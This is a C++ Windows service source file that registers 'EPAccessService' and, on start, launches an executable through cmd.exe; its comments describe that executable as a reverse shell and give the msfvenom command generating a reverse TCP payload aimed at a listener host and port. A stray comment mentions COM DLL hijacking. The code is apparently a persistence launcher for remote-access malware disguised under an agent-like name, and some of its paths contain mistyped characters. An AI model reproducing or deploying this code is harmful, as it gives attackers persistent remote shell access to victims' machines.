#include <QcoreApplication>
#include <QTime>
#include <QFile>
#include <QProcess>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

#define SLEEP_TIME 5000

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

// run process meow.exe - reverse shell
int RunAgent() {

    void * lb;
    BOOL rv;
    HANDLE th;

    // for example: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe
    char cmd[] = "С:\\files\\EPAccessAgent.exe";
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(NULL, TEXT("C:\\Windows\\system32\\cmd.exe С:\\files\\EPAccessAgent.exe"), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    return 0;

    /*QString txt = "12345";
    QFile outFile("C:\\files\\debug.log");
    outFile.open(QIODevice::WriteOnly | QIODevice::Append);
    QTextStream ts(&outFile);
    ts << txt << Qt::endl;
    outFile.close();

    QProcess p;
    QString path = "C:\Windows\system32>cmd.exe";
    QStringList commands;
    commands.append("C:\files\EPAccessAgent.exe");
    p.start(path, commands);*/

    /*QCoreApplication a(argc, argv);
    return a.exec();*/
}

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {(wchar_t*)"EPAccessService", (LPSERVICE_MAIN_FUNCTION) ServiceMain},
        {NULL, NULL}
    };
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char** argv) {

    serviceStatus.dwServiceType             = SERVICE_WIN32;
    serviceStatus.dwCurrentState            = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    serviceStatus.dwWin32ExitCode           = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint              = 0;
    serviceStatus.dwWaitHint                = 0;

    hStatus = RegisterServiceCtrlHandler((const wchar_t*)"EPAccessService", (LPHANDLER_FUNCTION)ControlHandler);
    RunAgent();

    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus (hStatus, &serviceStatus);

    while (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
        Sleep(SLEEP_TIME);
    }
    return;
}

void ControlHandler(DWORD request) {
    switch(request) {
    case SERVICE_CONTROL_STOP:
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState  = SERVICE_STOPPED;
        SetServiceStatus (hStatus, &serviceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState  = SERVICE_STOPPED;
        SetServiceStatus (hStatus, &serviceStatus);
        return;

    default:
        break;//COM DLL hijack
    }
    SetServiceStatus(hStatus,  &serviceStatus);
    return;
}
